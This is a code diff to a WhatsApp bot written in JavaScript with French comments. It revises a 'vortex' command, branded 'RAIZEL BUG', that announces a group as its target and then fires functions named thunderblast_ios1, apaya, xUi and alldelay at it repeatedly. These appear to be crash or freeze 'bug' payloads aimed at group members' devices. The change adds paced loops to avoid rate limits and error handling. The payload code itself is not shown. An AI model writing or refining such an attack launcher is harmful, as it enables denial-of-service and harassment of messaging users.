@@ -1008,39 +1008,43 @@ const freeze = {
 const Vortex = {
   name: "vortex",
   execute: async (sock, m, args, from) => {
-    if (!m.key.remoteJid.endsWith("@g.us")) {
+    // Vérifie qu'on est bien dans un groupe
+    if (!from || !from.endsWith("@g.us")) {
       return sock.sendMessage(from, { text: "❌ Cette commande doit être utilisée dans un groupe." }, { quoted: m });
     }
 
-    let target = from;
+    const target = from;
 
     await sock.sendMessage(from, {
       image: { url: global.imgCrL || DEFAULT_IMG },
       caption: `⚡ *VORTEX ACTIVÉ !*\n\n🎯 Cible : *Ce Groupe*\n🛡️ Module : *RAIZEL BUG Vortex*`
     }, { quoted: m });
 
-    await sleep(2000);
+    await sleep(1500);
 
-    await thunderblast_ios1(sock, target);
-    await sleep(1000);
-    await apaya(sock, target);
-    await sleep(1000);
-    await xUi(sock, target);
-    await thunderblast_ios1(sock, target);
-    await sleep(1000);
-    await thunderblast_ios1(sock, target);
-    await sleep(1000);
-    await xUi(sock, target);
-    await apaya(sock, target);
-    await alldelay(sock, target);
-    await sleep(1000);
-    await thunderblast_ios1(sock, target);
-    await sleep(1000);
-    await thunderblast_ios1(sock, target);
-    await sleep(1000);
-    await thunderblast_ios1(sock, target);
+    try {
+      await thunderblast_ios1(sock, target);
+      await sleep(1200);
+      await apaya(sock, target);
+      await sleep(1200);
+      await xUi(sock, target);
+      await sleep(1200);
+      await thunderblast_ios1(sock, target);
+      await xUi(sock, target);
+      await sleep(1500);
 
-    await sock.sendMessage(from, { react: { text: "⚡", key: m.key } });
+      // Boucles limitées pour éviter "overlimit"
+      for (let i = 0; i < 3; i++) {
+        await alldelay(sock, target);
+        await sleep(2000);
+        await thunderblast_ios1(sock, target);
+      }
+
+      await sock.sendMessage(from, { react: { text: "⚡", key: m.key } });
+    } catch (err) {
+      console.log("⚠️ Erreur dans Vortex :", err);
+      await sock.sendMessage(from, { text: `❌ Erreur : ${err.message || err}` }, { quoted: m });
+    }
   },
 };
 
